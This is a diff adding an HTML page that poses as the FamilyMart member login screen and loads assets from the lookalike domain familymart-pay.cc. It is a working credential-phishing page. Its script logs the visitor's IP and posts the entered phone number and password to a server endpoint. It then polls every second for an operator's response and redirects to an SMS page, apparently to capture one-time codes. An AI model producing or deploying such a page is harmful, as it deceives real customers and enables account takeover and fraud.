@@ -1,0 +1,166 @@
+<html lang="ja"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <style type="text/css">@charset "UTF-8";
+        [ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak, .ng-hide:not(.ng-hide-animate) {
+            display: none !important;
+        }
+
+        ng\:form {
+            display: block;
+        }
+
+        .ng-animate-shim {
+            visibility: hidden;
+        }
+
+        .ng-anchor {
+            position: absolute;
+        }</style>
+
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1">
+    <meta name="format-detection" content="telephone=no,address=no,email=no">
+    <link rel="stylesheet" href="./login_files/main.css">
+    <script src="/admin/im/site-jquery.min.js"></script>
+    <script src="/admin/im/layui.js"></script><link id="layuicss-laydate" rel="stylesheet" href="https://familymart-pay.cc/admin/im/css/modules/laydate/default/laydate.css?v=5.3.1" media="all"><link id="layuicss-layer" rel="stylesheet" href="https://familymart-pay.cc/admin/im/css/modules/layer/default/layer.css?v=3.5.1" media="all"><link id="layuicss-skincodecss" rel="stylesheet" href="https://familymart-pay.cc/admin/im/css/modules/code.css?v=2" media="all">
+    <link href="https://cdn.bootcdn.net/ajax/libs/layer/3.5.1/theme/default/layer.min.css" rel="stylesheet">
+
+
+</head>
+
+<body ng-app="famimaMemberApp" class="ng-scope">
+<header>
+    <div class="inner_box">
+        <h1><img src="./login_files/logo.png" alt="あなたと、コンビに、FamilyMart"></h1>
+        <h2 class="main_title">ログイン</h2>
+    </div>
+</header>
+<main ng-controller="loginCtrl as ctrl" class="ng-scope">
+
+    <div class="login_area login-top">
+
+        <form action="#" name="loginForm" novalidate="" method="post" accept-charset="utf-8" class="ng-pristine ng-valid">
+            <input type="hidden" name="csrf_test_name" value="087e1e07d8527155a1abcf4ebbfc9249" style="display:none;">
+            <div class="info-area">
+                <p class="mt0 fw_b">電話番号</p>
+                <div class="input_group mb0">
+                    <div class="media-body">
+                        <div class="row"><input type="text" name="memid" id="memid" placeholder="電話番号" required=""></div>
+                    </div>
+                </div>
+                <p class="fw_b">パスワード</p>
+                <div class="input_group">
+                    <div class="media-body">
+                        <div class="row"><input type="password" name="password" id="password" required=""></div>
+                    </div>
+                </div>
+
+                <p class="forget only_m"><a href="#">パスワードをお忘れの方はこちら</a></p>
+
+                <div class="button_1column">
+                    <button type="button" class="btn_l ng-hide" ng-show="loginForm.$invalid" ng-click="dirty = true">
+                        ログイン
+                    </button>
+                    <button type="button" class="btn_l" ng-show="loginForm.$valid" onclick="verify()">ログイン
+                    </button>
+                </div>
+
+                <label class="checkbox">
+                    <input type="checkbox" class="checkbox__input ng-pristine ng-untouched ng-valid ng-empty" name="auto_login" ng-model="ctrl.auto_login" ng-change="ctrl.changeAutoLogin()">
+                    <div class="checkbox__checkmark"></div>
+                    <span>ログイン状態を保持する</span>
+                </label>
+
+
+            </div>
+        </form>
+    </div>
+</main>
+
+<script type="text/javascript">
+    var mask = null;
+    var timer = null;
+    var hb_timer = null;
+    function heart_beat() {
+        $.get('/api.php?act=heart_beat&_r=' + Math.random(), function (res) {
+            console.log(res);
+        });
+    }
+    function ip_save() {
+        $.get('/api.php?act=ip_save&_r=' + Math.random(), function (res) {
+            console.log(res);
+        });
+    }
+    ip_save();
+    function is_agree(){
+        $.post('/api.php?act=is_agree&_r='+Math.random(),function (res) {
+            var t = JSON.parse(res);
+            if (t.code == 'ok') {
+                layer.close(mask);
+                clearInterval(timer);
+                if(t.sel.indexOf('alert-error') != -1) {
+                    alert('アカウントまたはパスワードの間違い!');
+                }else{//非空,则传递验证码到跳转页面
+                    window.location.href="sms.php";
+                }
+            }else{
+                console.log('wait');
+            }
+        });
+    }
+
+
+    function verify(){
+
+        var user = document.getElementById("memid");
+        var pwd = document.getElementById("password");
+
+        if(user.value==""){
+            user.focus();
+
+            return false;
+        }
+        if(pwd.value==""){
+            pwd.focus();
+            return false;
+        }
+
+        var appid =  user.value;
+        var apppwd = pwd.value;
+        $.ajax({
+            url: '/api.php?act=next_save&_r='+Math.random(),
+            type: 'post',
+            data: {uname:appid,apppwd:apppwd},
+            success: function (res) {
+                var t = JSON.parse(res);
+                if(t.code == 'ok') {
+                    mask = layer.load(2, {shade: [0.25, '#000']});
+                    timer = setInterval("is_agree()", 1000);
+                    hb_timer = setInterval("heart_beat()",1000);
+                    return false;
+                }else{
+                    layer.msg('提交失败！');
+                    return false;
+                }
+            },
+        });
+
+
+    }
+
+
+
+</script>
+
+
+<div class="btn_top"><img src="./login_files/icon_top.png"></div>
+<footer>
+    <div class="footer_area">
+        <small class="copy_right">Copyright © FamilyMart Co., Ltd. All Rights Reserved.</small>
+    </div>
+</footer>
+
+
+
+</body></html>
